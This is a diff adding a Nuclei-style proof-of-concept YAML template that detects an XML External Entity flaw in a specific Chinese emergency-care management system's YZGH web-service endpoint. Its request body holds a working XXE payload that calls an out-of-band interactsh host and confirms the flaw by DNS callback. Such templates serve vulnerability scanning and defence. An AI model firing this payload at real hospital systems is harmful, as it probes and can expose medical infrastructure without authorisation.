@@ -1,0 +1,34 @@
+id: poc-yaml-bian-que-ivtbq-ieqcs-yzgh-xxe
+info:
+  name: 扁鹊飞救智能急救与质控系统 YZGH XML实体注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,xxe
+  description: |
+    This template checks for XML External Entity (XXE) vulnerability in 扁鹊飞救智能急救与质控系统 YZGH.
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: POST
+    path:
+      - "/AppService/BQMedical/WebServiceForFirstaidApp.asmx/YZGH"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |-
+      requestXml=<?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{reverse}}"> %remote;]>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "远程服务器"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
